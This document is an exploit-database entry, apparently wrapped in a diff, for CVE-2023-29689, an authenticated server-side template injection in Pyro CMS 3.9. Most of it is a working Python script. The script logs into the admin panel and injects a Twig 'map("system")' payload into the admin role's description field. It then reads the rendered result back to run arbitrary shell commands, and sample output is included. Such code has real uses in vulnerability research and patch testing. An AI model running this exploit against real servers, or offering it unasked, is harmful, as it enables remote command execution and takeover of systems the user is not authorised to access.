@@ -1,0 +1,82 @@
+id: 38956
+date: 08/08/2023
+title: Pyro CMS 3.9 - Server-Side Template Injection (SSTI) (Authenticated) Exploit
+author: Daniel Barros
+cves: CVE-2023-29689
+
+# Exploit Title: Pyro CMS 3.9 - Server-Side Template Injection (SSTI) (Authenticated)
+# Exploit Author: Daniel Barros (@cupc4k3d) - Hakai Offensive Security
+# Vendor: https://pyrocms.com/
+# Software Link: https://pyrocms.com/documentation/pyrocms/3.9/getting-started/installation
+# Vulnerable Version(s): 3.9
+# CVE: CVE-2023-29689
+# Notes: You need a user who has access to /admin privilege
+
+# Example Usage:
+# First, run the script: python3 CVE-2023-29689.py
+# Please follow these steps:
+# 1. Enter the application URL: http://localhost:8000
+# 2. Enter the email for authentication: admin@adm.com
+# 3. Enter the password: Admin@@2023
+# 4. Enter the command to be executed: id
+# Result of command execution:
+# uid=1000(cupcake) gid=1000(cupcake) groups=1000(cupcake)
+
+import requests
+from bs4 import BeautifulSoup
+from urllib.parse import urljoin
+
+def login(session, url, email, password):
+    login_url = urljoin(url, '/admin/login')
+    response = session.get(login_url)
+    soup = BeautifulSoup(response.content, 'html.parser')
+    token = soup.find('input', {'name': '_token'})['value']
+
+    payload = {
+        '_token': token,
+        'email': email,
+        'password': password
+    }
+
+    session.post(login_url, data=payload)
+
+# Function to edit role 1 and extract the Description of the Admin user.
+def edit_role_and_extract_description(session, url, command):
+    edit_role_url = urljoin(url, '/admin/users/roles/edit/1')
+    response = session.get(edit_role_url)
+    soup = BeautifulSoup(response.content, 'html.parser')
+    token = soup.find('input', {'name': '_token'})['value']
+
+    payload = {
+        '_token': token,
+        'name_en': 'Admin',
+        'slug': 'admin',
+        'description_en': f'{{{{["{command}"]|map("system")|join}}}}',
+        'action': 'save_exit'
+    }
+
+    session.post(edit_role_url, data=payload)
+
+    # Extract the updated Description from role 1.
+    response = session.get(urljoin(url, '/admin/users/roles'))
+    soup = BeautifulSoup(response.content, 'html.parser')
+    description = soup.find('td', {'data-title': 'Description'}).text.strip()
+
+    return description
+    
+def main():
+    url = input("Enter the application URL: ")
+    email = input("Enter the email for authentication: ")
+    password = input("Enter the password : ")
+    command = input("Enter the command to be executed: ")
+
+    with requests.Session() as session:
+        login(session, url, email, password)
+        description = edit_role_and_extract_description(session, url, command)
+        print("\nResult of command execution:")
+        print(description)
+
+if __name__ == "__main__":
+    main()
+
+#  0day.today [2023-08-09]  #
